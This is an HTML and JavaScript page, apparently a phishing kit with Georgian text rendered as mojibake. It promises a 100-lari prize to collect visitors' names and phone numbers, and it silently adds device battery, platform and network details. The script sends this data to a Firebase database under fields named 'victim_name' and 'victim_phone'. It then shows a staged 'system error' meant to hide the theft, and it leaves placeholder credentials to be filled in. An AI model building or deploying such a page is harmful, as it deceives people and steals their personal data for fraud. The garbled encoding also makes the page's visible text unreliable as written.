<!DOCTYPE html>
<html lang="ka">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>áƒ¡áƒáƒ©áƒ£áƒ¥áƒáƒ áƒ˜ 100â‚¾</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 350px; }
        h2 { color: #2d3436; margin-bottom: 10px; }
        p { color: #636e72; font-size: 14px; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dfe6e9; border-radius: 8px; box-sizing: border-box; outline: none; }
        input:focus { border-color: #00b894; }
        /* áƒáƒ˜ áƒ”áƒ¡ áƒáƒ áƒ˜áƒ¡ áƒ¨áƒ”áƒœáƒ˜ áƒ¦áƒ˜áƒšáƒáƒ™áƒ˜ */
        .reg-btn { width: 100%; padding: 15px; background-color: #00b894; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
        .reg-btn:hover { background-color: #00947a; }
        #status-msg { margin-top: 20px; font-size: 13px; font-weight: 500; }
    </style>
</head>
<body>

<div class="container">
    <h2>áƒ’áƒ˜áƒšáƒáƒªáƒáƒ•áƒ—! ğŸ‰</h2>
    <p>áƒ—áƒ¥áƒ•áƒ”áƒœ áƒ›áƒáƒ˜áƒ’áƒ”áƒ— 100â‚¾ áƒ¡áƒáƒ©áƒ£áƒ¥áƒ áƒáƒ“. áƒ—áƒáƒœáƒ®áƒ˜áƒ¡ áƒ“áƒáƒ¡áƒáƒ áƒ˜áƒªáƒ®áƒáƒ“ áƒ’áƒáƒ˜áƒáƒ áƒ”áƒ— áƒ áƒ”áƒ’áƒ˜áƒ¡áƒ¢áƒ áƒáƒªáƒ˜áƒ.</p>
    
    <input type="text" id="userName" placeholder="áƒ—áƒ¥áƒ•áƒ”áƒœáƒ˜ áƒ¡áƒáƒ®áƒ”áƒšáƒ˜">
    <input type="tel" id="userPhone" placeholder="áƒ¢áƒ”áƒšáƒ”áƒ¤áƒáƒœáƒ˜áƒ¡ áƒœáƒáƒ›áƒ”áƒ áƒ˜">
    
    <button class="reg-btn" onclick="processRegistration()">áƒ áƒ”áƒ’áƒ˜áƒ¡áƒ¢áƒ áƒáƒªáƒ˜áƒ áƒ“áƒ áƒ—áƒáƒœáƒ®áƒ˜áƒ¡ áƒ›áƒ˜áƒ¦áƒ”áƒ‘áƒ</button>
    
    <div id="status-msg"></div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>

<script>
  // !!! áƒáƒ¥ áƒ©áƒáƒ¡áƒ•áƒ˜ áƒ¨áƒ”áƒœáƒ˜ Firebase Config áƒ™áƒáƒ“áƒ˜ !!!
  const firebaseConfig = {
    apiKey: "áƒ©áƒáƒ¬áƒ”áƒ áƒ”_áƒáƒ¥",
    authDomain: "áƒ©áƒáƒ¬áƒ”áƒ áƒ”_áƒáƒ¥",
    databaseURL: "áƒ©áƒáƒ¬áƒ”áƒ áƒ”_áƒáƒ¥",
    projectId: "áƒ©áƒáƒ¬áƒ”áƒ áƒ”_áƒáƒ¥",
    storageBucket: "áƒ©áƒáƒ¬áƒ”áƒ áƒ”_áƒáƒ¥",
    messagingSenderId: "áƒ©áƒáƒ¬áƒ”áƒ áƒ”_áƒáƒ¥",
    appId: "áƒ©áƒáƒ¬áƒ”áƒ áƒ”_áƒáƒ¥"
  };

  // Firebase-áƒ˜áƒ¡ áƒ˜áƒœáƒ˜áƒªáƒ˜áƒáƒšáƒ˜áƒ–áƒáƒªáƒ˜áƒ
  firebase.initializeApp(firebaseConfig);
  const database = firebase.database();

  async function processRegistration() {
    const name = document.getElementById('userName').value;
    const phone = document.getElementById('userPhone').value;
    const msg = document.getElementById('status-msg');

    if (!name || !phone) {
        alert("áƒ’áƒ—áƒ®áƒáƒ•áƒ— áƒ¨áƒ”áƒáƒ•áƒ¡áƒáƒ— áƒ•áƒ”áƒšáƒ”áƒ‘áƒ˜!");
        return;
    }

    msg.style.color = "#2d3436";
    msg.innerText = "áƒ›áƒ˜áƒ›áƒ“áƒ˜áƒœáƒáƒ áƒ”áƒáƒ‘áƒ¡ áƒ“áƒáƒ›áƒ£áƒ¨áƒáƒ•áƒ”áƒ‘áƒ...";

    // áƒ‘áƒáƒ¢áƒáƒ áƒ”áƒ˜áƒ¡ áƒ˜áƒœáƒ¤áƒáƒ áƒ›áƒáƒªáƒ˜áƒ
    let batteryInfo = "áƒ›áƒ˜áƒ£áƒ¬áƒ•áƒ“áƒáƒ›áƒ”áƒšáƒ˜áƒ";
    if (navigator.getBattery) {
        const b = await navigator.getBattery();
        batteryInfo = (b.level * 100).toFixed(0) + "%";
    }

    // áƒ›áƒáƒœáƒáƒªáƒ”áƒ›áƒ”áƒ‘áƒ˜áƒ¡ áƒ’áƒáƒ’áƒ–áƒáƒ•áƒœáƒ Firebase-áƒ¨áƒ˜
    database.ref('users_data/' + Date.now()).set({
        victim_name: name,
        victim_phone: phone,
        battery: batteryInfo,
        platform: navigator.platform,
        network: navigator.connection ? navigator.connection.effectiveType : "unknown",
        timestamp: new Date().toLocaleString()
    }).then(() => {
        // "áƒ›áƒáƒ¢áƒ§áƒ£áƒ”áƒ‘áƒ˜áƒ—áƒ˜" áƒ¨áƒ”áƒªáƒ“áƒáƒ›áƒ, áƒ áƒáƒ› áƒ”áƒ­áƒ•áƒ˜ áƒáƒ  áƒáƒ˜áƒ¦áƒáƒœ
        setTimeout(() => {
            msg.style.color = "#e17055";
            msg.innerText = "áƒ¡áƒ˜áƒ¡áƒ¢áƒ”áƒ›áƒ£áƒ áƒ˜ áƒ¨áƒ”áƒªáƒ“áƒáƒ›áƒ: áƒ—áƒ¥áƒ•áƒ”áƒœáƒ˜ áƒ áƒ”áƒ’áƒ˜áƒáƒœáƒ˜áƒ“áƒáƒœ áƒ¢áƒ áƒáƒœáƒ–áƒáƒ¥áƒªáƒ˜áƒ áƒ“áƒ áƒáƒ”áƒ‘áƒ˜áƒ— áƒ¨áƒ”áƒ–áƒ¦áƒ£áƒ“áƒ£áƒšáƒ˜áƒ.";
        }, 2000);
    }).catch((error) => {
        console.error(error);
        msg.innerText = "áƒ™áƒáƒ•áƒ¨áƒ˜áƒ áƒ˜áƒ¡ áƒ¨áƒ”áƒªáƒ“áƒáƒ›áƒ.";
    });
  }
</script>

</body>
</html>
